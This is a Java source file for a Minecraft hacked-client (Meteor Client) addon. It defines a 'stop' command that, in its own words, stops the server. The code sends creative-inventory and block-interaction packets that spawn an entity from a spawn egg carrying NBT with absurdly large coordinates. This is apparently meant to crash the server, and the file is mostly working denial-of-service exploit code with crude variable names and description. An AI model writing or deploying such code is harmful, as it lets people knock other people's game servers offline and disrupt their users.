package me.onlyrain.randomaddon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
import static meteordevelopment.meteorclient.MeteorClient.mc;

public class StopCommand extends Command {
    public StopCommand() {
        super("stop", "allah stops the server");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            ItemStack bfr = mc.player.getMainHandStack();
            ItemStack sex = new ItemStack(Items.SALMON_SPAWN_EGG);
            sex.setNbt(StringNbtReader.parse("{EntityTag:{Pos:[420420420,133333337,69696969]}}"));
            BlockHitResult bhr = new BlockHitResult(mc.player.getPos(), Direction.DOWN, BlockPos.ofFloored(mc.player.getPos()), false);
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, sex));
            mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0));
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, bfr));
           return SINGLE_SUCCESS;
        });
    }
}
